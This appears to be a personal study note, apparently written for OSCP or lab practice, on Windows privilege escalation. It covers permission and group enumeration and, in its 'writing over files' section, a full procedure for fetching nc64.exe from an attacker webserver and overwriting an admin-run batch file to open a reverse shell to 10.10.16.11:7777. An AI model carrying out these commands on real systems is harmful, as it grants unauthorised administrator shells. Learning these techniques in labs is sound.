# Windows Privesc
﷽
* Broad guide/methodology on Windows privesc.
## methodology
## commands
* to check who can run a file, use
  * `icacls {file}`
* to check if we are part of `{group}`, use
  * `net localgroup {group}` eg. `net localgroup Users`
  * this will list users for said `{group}`
* check scheduled tasks:
  * `schtasks`
* or, enter `powershell` with said command and use `ps` to see processes.
### writing over files
* some files, eg. batch files always run as admin, a command we can exploit to gain a `nc` shell. This shell will therefore also be ***ran as admin :)***

* firstly, find the `nc64.exe` file (mine is in ~/hacking/oscp/binaries/)
* then, start a python3 webserver hosting the file in the dir the file is in:
  * `python3 -m http.server 8000`
* now, on the victim receive the file:
  * `wget http://{your-ip}:8000/nc64.exe -outfile nc64.exe` (make sure you're in `powershell` by entering in `powershell`).
* on the host computer, start a `nc` listener:
  * `nc -lvnp 7777`
* on the victim computer, leave PS:
  * `exit`
* now, on the victim overwrite the batch file to connect to that `nc` listener:
  * `echo C:\{nc64.exe-location} -e cmd.exe {your-ip} {your-nc-port} > {batch-file}`, so for example,:
  * `echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.16.11 7777 > job.bat`, where
    * `nc64.exe` is the nc location
    * `10.10.16.11` is my local ip on the host computer
    * `7777` is my nc listener port.

